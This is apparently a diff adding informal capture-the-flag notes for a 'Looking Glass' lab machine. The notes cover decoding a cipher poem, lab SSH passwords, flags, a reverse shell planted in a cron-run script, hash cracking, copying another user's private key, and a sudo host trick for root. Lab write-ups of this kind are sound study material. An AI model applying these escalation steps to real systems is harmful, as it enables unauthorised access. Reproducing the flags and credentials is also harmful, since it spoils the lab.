@@ -1,0 +1,135 @@
+looking glass:
+host doesnt have website or source osn 80's port
+if we will check for ports it gives a very big list with a lots of open ports.
+so i tried to connect and them gives value "lower" or "higher"
+it took 10 min to find a strange response on 10668:
+
+You've found the real service.
+Solve the challenge to get access to the box
+Jabberwocky:
+ 
+'Mdes mgplmmz, cvs alv lsmtsn aowil
+Fqs ncix hrd rxtbmi bp bwl arul;
+Elw bpmtc pgzt alv uvvordcet,
+Egf bwl qffl vaewz ovxztiql.
+
+'Fvphve ewl Jbfugzlvgb, ff woy!
+Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
+Bplhrf xag Rjinlu imro, pud tlnp
+Bwl jintmofh Iaohxtachxta!'
+
+Oi tzdr hjw oqzehp jpvvd tc oaoh:
+Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
+Hv rfwmgl wl fp moi Tfbaun xkgm,
+Puh jmvsd lloimi bp bwvyxaa.
+
+Eno pz io yyhqho xyhbkhe wl sushf,
+Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
+Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
+Pud cykdttk ej ba gaxt!
+
+Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
+Ewl vpvict qseux dine huidoxt-achgb!
+Al peqi pt eitf, ick azmo mtd wlae
+Lx ymca krebqpsxug cevm.
+
+'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
+Cpqx vw bf eifz, qy mthmjwa dwn!
+V jitinofh kaz! Gtntdvl! Ttspaj!'
+Wl ciskvttk me apw jzn.
+
+'Awbw utqasmx, tuh tst zljxaa bdcij
+Wph gjgl aoh zkuqsi zg ale hpie;
+Bpe oqbzc nxyi tst iosszqdtz,
+Eew ale xdte semja dbxxkhfe.
+Jdbr tivtmi pw sxderpIoeKeudmgdstd
+Enter Secret:	
+
+
+
+jabberwocky???
+i googled and found that:
+ Jabberwocky
+By Lewis Carroll
+https://www.poetryfoundation.org/poems/42916/jabberwocky
+its a undecoded value
+
+Your secret is bewareTheJabberwock
+ssh:
+jabberwock:MineralCalledTreatHedges
+jabberwock:SorryMeanwhileShapeMoment
+password and port changes after reboot but secret is the same
+jabberwock:GlidedComparisonMicroscopeRelented
+
+user.txt on jabberwock's home dir:
+}32a911966cab2d643f5d57d9e0173d56{mht
+thm{65d3710e9d75d5f346d2dac669119a23}
+
+sudo -l -l
+
+
+i found in /etc/crontab, that after reboot tweedledum launches the twas...sh on our desktop
+so i just added a reverse shell to it and i got him
+
+on his desktop i found humptydumpty.txt:
+dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
+7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
+28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
+b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
+fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
+b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
+5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
+
+ITS a sha256:
+maybe one of these is the password
+i cant decrypt the last one..
+
+https://hashes.com/en/decrypt/hash
+i found in internet that this site is best
+7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b:the password is zyxwvutsrqponmlk
+
+
+su humptydumpty:
+
+linpeas.sh:
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/usr/bin/mtr-packet = cap_net_raw+ep
+
+[+] Users with capabilities
+
+[+] Files with ACLs
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+/usr/bin/gettext.sh
+
+
+ls: cannot open directory '.ssh': Permission denied
+humptydumpty@looking-glass:/home/alice$ ls -la .sshs
+ls: cannot access '.sshs': No such file or directory
+humptydumpty@looking-glass:/home/alice$ ls -la .ssh/id
+ls: cannot access '.ssh/id': No such file or directory
+humptydumpty@looking-glass:/home/alice$ ls -la .ssh/id-rsa
+ls: cannot access '.ssh/id-rsa': No such file or directory
+humptydumpty@looking-glass:/home/alice$ ls -la .ssh/id_rsa
+-rw------- 1 humptydumpty humptydumpty 1679 Jul  3  2020 .ssh/id_rsa
+humptydumpty@looking-glass:/home/alice$ ls -la .ssh/id_rsa
+
+
+get it and
+chmod 600 id_rsa
+ssh -i id_rsa alice@ip 
+ 
+???
+i fond that in internet:
+
+cat /etc/sudoers.d/alice 
+i can run as root with host ssalg-gnikool
+sudo -h ssalg-gnikool /bin/bash
+
+}f3dae6dec817ad10b750d79f6b7332cb{mht
+
+
